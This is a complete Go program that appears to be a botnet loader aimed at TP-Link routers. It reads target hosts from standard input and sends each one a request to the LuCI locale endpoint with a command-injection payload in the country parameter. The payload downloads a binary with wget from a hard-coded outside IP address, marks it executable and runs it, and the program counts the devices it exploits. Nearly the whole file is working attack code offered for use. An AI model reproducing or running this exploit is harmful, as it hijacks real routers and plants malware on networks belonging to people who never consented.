package main

import (
	"net"
	"runtime"
	"os"
	"net/url"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
)

var (
	port string
	wg sync.WaitGroup

	timeout = 15 * time.Second

	processed uint64
	found uint64
	exploited uint64

	payload = "id>`cd /tmp; rm -rf lol; wget http://45.95.146.126/lol; chmod 777 lol; ./lol tplink; rm -rf lol`"
)

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()
	found++

	conn, err := net.DialTimeout("tcp", target, 15 * time.Second)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(15 * time.Second))
	conn.Write([]byte("GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + url.QueryEscape(payload) + ") HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	buff := make([]byte, 1024)
	conn.Read(buff)

	if strings.Contains(string(buff), "200 OK") {
		fmt.Printf("\033[01;32m[tplink] exploiting %s\033[0m\n", target)
		exploited++
	}
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d | Go Routines: %d\n", 
			processed, found, exploited, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

		if len(os.Args) == 2 {
		port = os.Args[1]
	}
	
	for scanner.Scan() {
		if len(port) != 0 {
			go exploitDevice(scanner.Text() + ":" + port)
		} else {
			go exploitDevice(scanner.Text())
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}